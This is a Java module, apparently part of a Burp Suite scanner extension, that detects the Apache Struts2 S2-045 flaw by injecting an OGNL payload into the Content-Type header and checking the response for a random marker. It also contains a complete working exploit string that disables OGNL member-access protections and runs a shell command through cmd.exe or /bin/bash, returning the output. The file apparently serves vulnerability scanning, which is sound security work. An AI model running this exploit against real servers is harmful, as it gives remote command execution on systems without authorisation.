package module.java.vul;

import burp.*;
import module.Util;

import java.io.PrintWriter;
import java.util.Arrays;
import java.util.List;

public class S2_045 extends IModule {
    public String randomMark = Util.getRandomString(16);
    public String[] injectMark = new String[]{randomMark.substring(0, 9), randomMark.substring(9, 16)};

    public String poc =
            "%{" +
            "#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('xxx','"+injectMark[0]+"'+'"+injectMark[1]+"')" +
            "}.multipart/form-data";
    public String exp =
            "%{" +
            "(#nike='multipart/form-data')" +
            ".(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)" +
            ".(" +
            "#_memberAccess?(#_memberAccess=#dm):" +
            "(" +
            "(#container=#context['com.opensymphony.xwork2.ActionContext.container'])" +
            ".(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))" +
            ".(#ognlUtil.getExcludedPackageNames().clear())" +
            ".(#ognlUtil.getExcludedClasses().clear())" +
            ".(#context.setMemberAccess(#dm))" +
            ")" +
            ")" +
            ".(#cmd='whoami')" +
            ".(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))" +
            ".(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))" +
            ".(#p=new java.lang.ProcessBuilder(#cmds))" +
            ".(#p.redirectErrorStream(true))" +
            ".(#process=#p.start())" +
            ".(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))" +
            ".(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))" +
            ".(#ros.flush())" +
            "}";

    @Override
    public IScanIssue start() {
        IHttpService httpService = iHttpRequestResponse.getHttpService();
        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
        PrintWriter out = new PrintWriter(callbacks.getStdout(), true);

        int bodyOffset = requestInfo.getBodyOffset();
        byte[] request = iHttpRequestResponse.getRequest();
        byte[] requestBody = Arrays.copyOfRange(request, bodyOffset, request.length);

        List<String> headers = requestInfo.getHeaders();
        for (String header: headers) {
            if (header.contains("Content-Type")) {
                headers.remove(header);
                break;
            }
        }

        headers.add("Content-Type: " + poc);
        byte[] newRequest = helpers.buildHttpMessage(headers, requestBody);
        IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
        byte[] response = newHttpRequestResponse.getResponse();
        String responseText = helpers.bytesToString(response);
        if (responseText.contains(randomMark)) {
            this.iHttpRequestResponse = newHttpRequestResponse;
            this.detail = exp;
            return creatCustomScanIssue();
        }

        return null;
    }
}
